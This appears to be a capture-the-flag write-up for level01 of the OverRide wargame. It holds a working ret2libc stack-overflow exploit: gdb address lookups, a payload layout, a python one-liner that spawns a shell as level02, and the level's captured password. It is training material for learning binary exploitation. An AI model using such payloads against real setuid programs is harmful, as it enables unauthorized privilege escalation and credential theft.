# level01

## Header

```bash
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level01/level01
```

<hr>

## Solution

From the [disassembled binary](./source.s) we can understand, that there is no shell callers.

Let's look at the [source](./source.c) code:
```c
char a_user_name[100];
...
int main() {
    ...
    char pass[64];
    ...
    fgets(a_user_name, 0x100, stdin);
    ...
    fgets(pass, 0x64, stdin);
    ...
}
```

We see, that in both cases `fgets` tries to read more characters than the size of a buffer.

So, we're going to use `ret2libc` by overflowing `pass` array.

First, we need the address of a `system` and `/bin/sh` string:
```bash
(gdb) info proc map
process 1855
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
         0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
         0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
        0xf7e2b000 0xf7e2c000     0x1000        0x0 
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
---Type <return> to continue, or q <return> to quit---q
Quit
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:      "/bin/sh"
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

To overwrite `main`'s return address, we need to pass the following payload to the `pass` array:
```
64 bytes to fill array + 
 4 bytes to fill int passed +
 4 bytes to fill saved ebx +
 4 bytes to fill saved edi +
 4 bytes to fill saved ebp +
 4 bytes to overwrite return address of main +
 4 bytes to fill return address of the system +
 4 bytes to pass argument to system ('/bin/sh')
 = 92 bytes
```

To overflow `pass` array, we need to pass username validation, so we must pass `dat_wil\n` first, to trigger the first `fgets` to read only 8 bytes and stop.

Now, let's exploit:
```bash
level01@OverRide:~$ (python -c 'print "dat_wil\n" + "X" * 80 + "\xf7\xe6\xae\xd0"[::-1] + "X" * 4 + "\xf7\xf8\x97\xec"[::-1]'; cat) | ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

id
uid=1001(level01) gid=1001(level01) euid=1002(level02) egid=100(users) groups=1002(level02),100(users),1001(level01)
whoami
level02
pwd
/home/users/level01
cd ../level02
ls -la   
total 21
dr-xr-x---+ 1 level02 level02   80 Sep 13  2016 .
dr-x--x--x  1 root    root     260 Oct  2  2016 ..
-rw-r--r--  1 level02 level02  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level02 level02 3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 level03 users   9452 Sep 10  2016 level02
-rw-r--r--+ 1 level02 level02   41 Oct 19  2016 .pass
-rw-r--r--  1 level02 level02  675 Sep 10  2016 .profile
cat .pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

## References
- [Stack overflow preparation](https://snovvcrash.rocks/2019/10/20/classic-stack-overflow.html)
- [ret2libc](https://wiki.bi0s.in/pwning/return2libc/return-to-libc/)
- [RELRO and why rewriting GOT through global array here is not possible](https://ctf101.org/binary-exploitation/relocation-read-only/)

